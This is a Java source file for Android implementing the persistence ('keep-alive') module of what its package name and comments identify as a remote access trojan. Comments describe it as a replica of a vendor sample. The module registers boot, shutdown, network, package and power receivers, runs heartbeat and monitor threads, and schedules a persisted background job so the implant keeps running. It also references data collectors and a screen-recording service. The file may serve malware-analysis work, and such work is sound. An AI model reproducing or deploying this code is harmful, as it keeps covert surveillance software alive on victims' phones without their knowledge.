package com.vendor.rat.keepalive;

import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.os.Build;
import android.util.Log;

import com.vendor.rat.control.service.MediaLiveService;
import com.vendor.rat.data.collector.AlarmReceiver;
import com.vendor.rat.data.collector.BatteryLevelReceiver;
import com.vendor.rat.data.collector.LocaleChangeReceiver;
import com.vendor.rat.data.collector.NetWorkReceiver;
import com.vendor.rat.data.collector.PowerBroadcastReceiver;
import com.vendor.rat.data.collector.ShutDownBroadcastReceiver;
import com.vendor.rat.keepalive.thread.CheckThread;
import com.vendor.rat.keepalive.thread.HeartThread;

/**
 * 保活管理器 (模块 07 核心)
 *
 * 4 层保活架构:
 *   1. 系统广播监听
 *   2. 前台服务
 *   3. 定时唤醒
 *   4. 辅助保活（账号同步 + 进程监控）
 */
public class KeepAliveManager {

    private static final String TAG = "KeepAliveManager";
    private static volatile KeepAliveManager instance;

    private CheckThread checkThread;
    private HeartThread heartThread;
    private volatile boolean lowPowerMode = false;

    private KeepAliveManager() {}

    public static KeepAliveManager getInstance() {
        if (instance == null) {
            synchronized (KeepAliveManager.class) {
                if (instance == null) {
                    instance = new KeepAliveManager();
                }
            }
        }
        return instance;
    }

    /**
     * 初始化所有保活机制
     */
    public void init(Context context) {
        // 1. 注册广播
        registerReceivers(context);

        // 2. 启动监控线程
        startCheckThread();

        // 3. 启动心跳线程
        startHeartThread();

        // 4. 初始化 JobScheduler 保活
        initJobScheduler(context);

        Log.i(TAG, "KeepAliveManager initialized");
    }

    /**
     * 注册所有保活广播
     * ADAPT: vendor 在 MainApplication.init() 中通过 g.W0()~m1() 逐个注册
     * replica 统一在此处注册
     */
    private void registerReceivers(Context context) {
        int flag = Build.VERSION.SDK_INT >= 33 ? Context.RECEIVER_EXPORTED : 0;

        // 1. 电池状态 (vendor: g.b1())
        IntentFilter batteryFilter = new IntentFilter();
        batteryFilter.addAction(Intent.ACTION_BATTERY_CHANGED);
        batteryFilter.addAction(Intent.ACTION_POWER_CONNECTED);
        batteryFilter.addAction(Intent.ACTION_POWER_DISCONNECTED);
        if (Build.VERSION.SDK_INT >= 33) {
            context.registerReceiver(new BatteryLevelReceiver(), batteryFilter, flag);
        } else {
            context.registerReceiver(new BatteryLevelReceiver(), batteryFilter);
        }
        Log.d(TAG, "BatteryLevelReceiver 启动完成");

        // 2. 充电/断电 (vendor: g.j1())
        IntentFilter powerFilter = new IntentFilter();
        powerFilter.addAction(Intent.ACTION_POWER_CONNECTED);
        powerFilter.addAction(Intent.ACTION_POWER_DISCONNECTED);
        if (Build.VERSION.SDK_INT >= 33) {
            context.registerReceiver(new PowerBroadcastReceiver(), powerFilter, flag);
        } else {
            context.registerReceiver(new PowerBroadcastReceiver(), powerFilter);
        }
        Log.d(TAG, "PowerBroadcastReceiver 启动完成");

        // 3. 关机 (vendor: g.h1())
        IntentFilter shutdownFilter = new IntentFilter();
        shutdownFilter.addAction(Intent.ACTION_SHUTDOWN);
        shutdownFilter.addAction("android.intent.action.QUICKBOOT_POWEROFF");
        if (Build.VERSION.SDK_INT >= 33) {
            context.registerReceiver(new ShutDownBroadcastReceiver(), shutdownFilter, flag);
        } else {
            context.registerReceiver(new ShutDownBroadcastReceiver(), shutdownFilter);
        }
        Log.d(TAG, "ShutDownBroadcastReceiver 启动完成");

        // 4. 网络变化 (vendor: g.i1())
        IntentFilter netFilter = new IntentFilter();
        netFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
        if (Build.VERSION.SDK_INT >= 33) {
            context.registerReceiver(new NetWorkReceiver(), netFilter, flag);
        } else {
            context.registerReceiver(new NetWorkReceiver(), netFilter);
        }
        Log.d(TAG, "NetWorkReceiver 启动完成");

        // 5. 定时唤醒 (vendor: g.W0())
        IntentFilter alarmFilter = new IntentFilter();
        alarmFilter.addAction("com.vendor.rat.ALARM_ACTION");
        if (Build.VERSION.SDK_INT >= 33) {
            context.registerReceiver(new AlarmReceiver(), alarmFilter, flag);
        } else {
            context.registerReceiver(new AlarmReceiver(), alarmFilter);
        }
        Log.d(TAG, "AlarmReceiver 启动完成");

        // 6. 语言变化 (vendor: MainApplication.init() 中注册)
        IntentFilter localeFilter = new IntentFilter();
        localeFilter.addAction(Intent.ACTION_LOCALE_CHANGED);
        if (Build.VERSION.SDK_INT >= 33) {
            context.registerReceiver(new LocaleChangeReceiver(), localeFilter, flag);
        } else {
            context.registerReceiver(new LocaleChangeReceiver(), localeFilter);
        }
        Log.d(TAG, "LocaleChangeReceiver 启动完成");

        // 7. 开机自启 (vendor: g.c1()) — 动态注册补充
        // 注意: BootBroadcast 已在 Manifest 静态注册，此处动态注册用于接收额外 action
        IntentFilter bootFilter = new IntentFilter();
        bootFilter.addAction(Intent.ACTION_BOOT_COMPLETED);
        bootFilter.addAction("android.intent.action.QUICKBOOT_POWERON");
        if (Build.VERSION.SDK_INT >= 33) {
            context.registerReceiver(new com.vendor.rat.data.collector.BootBroadcast(), bootFilter, flag);
        } else {
            context.registerReceiver(new com.vendor.rat.data.collector.BootBroadcast(), bootFilter);
        }
        Log.d(TAG, "BootBroadcast 启动完成");

        // 8. 应用安装/卸载 (vendor: g.i1())
        IntentFilter packageFilter = new IntentFilter();
        packageFilter.addAction(Intent.ACTION_PACKAGE_ADDED);
        packageFilter.addAction(Intent.ACTION_PACKAGE_REMOVED);
        packageFilter.addAction(Intent.ACTION_PACKAGE_REPLACED);
        packageFilter.addDataScheme("package");
        if (Build.VERSION.SDK_INT >= 33) {
            context.registerReceiver(new com.vendor.rat.data.collector.PackageReceiver(), packageFilter, flag);
        } else {
            context.registerReceiver(new com.vendor.rat.data.collector.PackageReceiver(), packageFilter);
        }
        Log.d(TAG, "PackageReceiver 启动完成");

        // 注意: ScreenBroadcastReceiver 在 DataCollectionManager.startAll() 中注册
        Log.i(TAG, "All keepalive receivers registered");
    }

    /**
     * 启动所有核心服务
     * ADAPT: MediaLiveService 不在此处启动，只在录屏权限通过后由 ActivMain.onActivityResult(1003) 启动
     * vendor: MediaLiveService 也不在 init() 中启动，只在 server/b.java 收到录屏指令时启动
     */
    public void startAllServices(Context context) {
        // 保活服务在此启动 (WIFIBackgroundService 等)
        // MediaLiveService 不在此处启动，避免触发通知权限弹窗
        Log.d(TAG, "startAllServices (MediaLiveService excluded)");
    }

    /**
     * 确保服务存活
     */
    public void ensureServicesRunning(Context context) {
        if (!lowPowerMode && context != null) {
            startAllServices(context);
        }
    }

    private void startCheckThread() {
        if (checkThread == null || !checkThread.isAlive()) {
            checkThread = new CheckThread();
            checkThread.setDaemon(true);
            checkThread.start();
        }
    }

    private void startHeartThread() {
        if (heartThread == null || !heartThread.isAlive()) {
            heartThread = new HeartThread();
            heartThread.setDaemon(true);
            heartThread.start();
        }
    }

    /**
     * 初始化 JobScheduler 保活
     * vendor: MainApplication.init() 行 315-340
     * Job ID 116, wifi-lock-server, 5s latency, network required
     */
    private void initJobScheduler(Context context) {
        try {
            JobScheduler jobScheduler = (JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (jobScheduler == null) return;

            if (jobScheduler.getPendingJob(116) == null) {
                // vendor: startService(WIFIBackgroundService) 先启动普通 Service
                try {
                    context.startService(new Intent(context, com.vendor.rat.keepalive.service.WIFIBackgroundService.class));
                } catch (Exception e) {
                    Log.w(TAG, "startService WIFIBackgroundService failed: " + e.getMessage());
                }

                // vendor: JobInfo.Builder(116, KeepAliveJobService)
                // ADAPT: vendor targets WIFIBackgroundService but it extends Service, not JobService
                // KeepAliveJobService extends JobService and is registered with BIND_JOB_SERVICE in Manifest
                ComponentName componentName = new ComponentName(context, KeepAliveJobService.class);
                JobInfo.Builder builder = new JobInfo.Builder(116, componentName);
                builder.setPersisted(true);
                builder.setRequiresCharging(false);
                builder.setRequiresDeviceIdle(false);
                builder.setBackoffCriteria(5000L, JobInfo.BACKOFF_POLICY_LINEAR);
                builder.setMinimumLatency(5000L);
                builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
                // ADAPT: vendor uses setTriggerContentMaxDelay(5000L) but this requires content URI trigger
                // builder.setTriggerContentMaxDelay(5000L);

                int result = jobScheduler.schedule(builder.build());
                if (result <= 0) {
                    Log.e(TAG, "wifi-lock-server job schedule failed");
                } else {
                    Log.d(TAG, "wifi-lock-server job schedule success");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "initJobScheduler failed", e);
        }
    }

    public void restartHeartThread() {
        if (heartThread != null) heartThread.stopHeartbeat();
        startHeartThread();
    }

    public HeartThread getHeartThread() { return heartThread; }
    public void enterLowPowerMode() { lowPowerMode = true; }
    public void exitLowPowerMode() { lowPowerMode = false; }

    public void shutdown() {
        if (checkThread != null) checkThread.stopChecking();
        if (heartThread != null) heartThread.stopHeartbeat();
    }
}
